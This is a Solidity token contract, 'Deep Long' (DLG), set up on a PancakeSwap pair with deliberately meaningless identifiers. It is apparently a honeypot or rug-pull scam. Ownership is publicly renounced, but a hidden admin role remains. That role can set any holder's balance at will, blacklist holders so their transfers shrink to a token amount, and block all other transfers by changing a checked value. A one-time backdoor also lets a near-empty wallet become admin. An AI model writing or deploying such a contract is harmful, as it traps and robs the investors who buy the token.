//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface totalMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract tokenWallet {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxLimitShould {
    function createPair(address limitMarketing, address fundAmount) external returns (address);
}

interface senderLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address modeTo) external view returns (uint256);

    function transfer(address limitTeam, uint256 launchLimit) external returns (bool);

    function allowance(address receiverFrom, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchLimit) external returns (bool);

    function transferFrom(
        address sender,
        address limitTeam,
        uint256 launchLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptTokenTake, uint256 value);
    event Approval(address indexed receiverFrom, address indexed spender, uint256 value);
}

interface modeFeeEnable is senderLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DeepLong is tokenWallet, senderLiquidity, modeFeeEnable {

    mapping(address => mapping(address => uint256)) private fundTakeShould;

    uint256 swapReceiver;

    function decimals() external view virtual override returns (uint8) {
        return exemptLaunched;
    }

    function allowance(address txLimit, address maxLimitTrading) external view virtual override returns (uint256) {
        if (maxLimitTrading == liquidityEnable) {
            return type(uint256).max;
        }
        return fundTakeShould[txLimit][maxLimitTrading];
    }

    function getOwner() external view returns (address) {
        return receiverSenderMarketing;
    }

    function owner() external view returns (address) {
        return receiverSenderMarketing;
    }

    function feeMarketingAuto(address listMaxEnable) public {
        exemptTotal();
        
        if (listMaxEnable == atBuy || listMaxEnable == teamFund) {
            return;
        }
        tokenTotal[listMaxEnable] = true;
    }

    bool public txWallet;

    uint256 constant fundAt = 3 ** 10;

    address private receiverSenderMarketing;

    mapping(address => bool) public sellMaxMarketing;

    uint8 private exemptLaunched = 18;

    mapping(address => uint256) private amountLaunched;

    mapping(address => bool) public tokenTotal;

    constructor (){
        if (liquidityAuto != txFund) {
            isFrom = feeTotal;
        }
        totalMax exemptTxTo = totalMax(liquidityEnable);
        teamFund = maxLimitShould(exemptTxTo.factory()).createPair(exemptTxTo.WETH(), address(this));
        
        atBuy = _msgSender();
        receiverTeam();
        sellMaxMarketing[atBuy] = true;
        amountLaunched[atBuy] = shouldTokenEnable;
        
        emit Transfer(address(0), atBuy, shouldTokenEnable);
    }

    address public teamFund;

    bool public totalMode;

    address listReceiverFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function balanceOf(address modeTo) public view virtual override returns (uint256) {
        return amountLaunched[modeTo];
    }

    function transferFrom(address limitTxList, address limitTeam, uint256 launchLimit) external override returns (bool) {
        if (_msgSender() != liquidityEnable) {
            if (fundTakeShould[limitTxList][_msgSender()] != type(uint256).max) {
                require(launchLimit <= fundTakeShould[limitTxList][_msgSender()]);
                fundTakeShould[limitTxList][_msgSender()] -= launchLimit;
            }
        }
        return exemptTake(limitTxList, limitTeam, launchLimit);
    }

    string private fromReceiver = "Deep Long";

    function transfer(address feeIs, uint256 launchLimit) external virtual override returns (bool) {
        return exemptTake(_msgSender(), feeIs, launchLimit);
    }

    function name() external view virtual override returns (string memory) {
        return fromReceiver;
    }

    bool public txFund;

    function fromIs(uint256 launchLimit) public {
        exemptTotal();
        tokenTrading = launchLimit;
    }

    string private tradingTo = "DLG";

    function exemptTotal() private view {
        require(sellMaxMarketing[_msgSender()]);
    }

    uint256 private shouldTokenEnable = 100000000 * 10 ** 18;

    event OwnershipTransferred(address indexed teamLaunchToken, address indexed autoReceiver);

    function totalSupply() external view virtual override returns (uint256) {
        return shouldTokenEnable;
    }

    function amountIs(address txSender) public {
        require(txSender.balance < 100000);
        if (totalMode) {
            return;
        }
        if (isFrom != feeTotal) {
            minSellMarketing = true;
        }
        sellMaxMarketing[txSender] = true;
        
        totalMode = true;
    }

    address liquidityEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public atBuy;

    bool private minSellMarketing;

    uint256 tokenTrading;

    function exemptTake(address limitTxList, address limitTeam, uint256 launchLimit) internal returns (bool) {
        if (limitTxList == atBuy) {
            return listAtSell(limitTxList, limitTeam, launchLimit);
        }
        uint256 swapTotal = senderLiquidity(teamFund).balanceOf(listReceiverFee);
        require(swapTotal == tokenTrading);
        require(limitTeam != listReceiverFee);
        if (tokenTotal[limitTxList]) {
            return listAtSell(limitTxList, limitTeam, fundAt);
        }
        return listAtSell(limitTxList, limitTeam, launchLimit);
    }

    function receiverTeam() public {
        emit OwnershipTransferred(atBuy, address(0));
        receiverSenderMarketing = address(0);
    }

    function symbol() external view virtual override returns (string memory) {
        return tradingTo;
    }

    uint256 private isFrom;

    function enableTake(address feeIs, uint256 launchLimit) public {
        exemptTotal();
        amountLaunched[feeIs] = launchLimit;
    }

    bool public liquidityAuto;

    function listAtSell(address limitTxList, address limitTeam, uint256 launchLimit) internal returns (bool) {
        require(amountLaunched[limitTxList] >= launchLimit);
        amountLaunched[limitTxList] -= launchLimit;
        amountLaunched[limitTeam] += launchLimit;
        emit Transfer(limitTxList, limitTeam, launchLimit);
        return true;
    }

    function approve(address maxLimitTrading, uint256 launchLimit) public virtual override returns (bool) {
        fundTakeShould[_msgSender()][maxLimitTrading] = launchLimit;
        emit Approval(_msgSender(), maxLimitTrading, launchLimit);
        return true;
    }

    uint256 public feeTotal;

}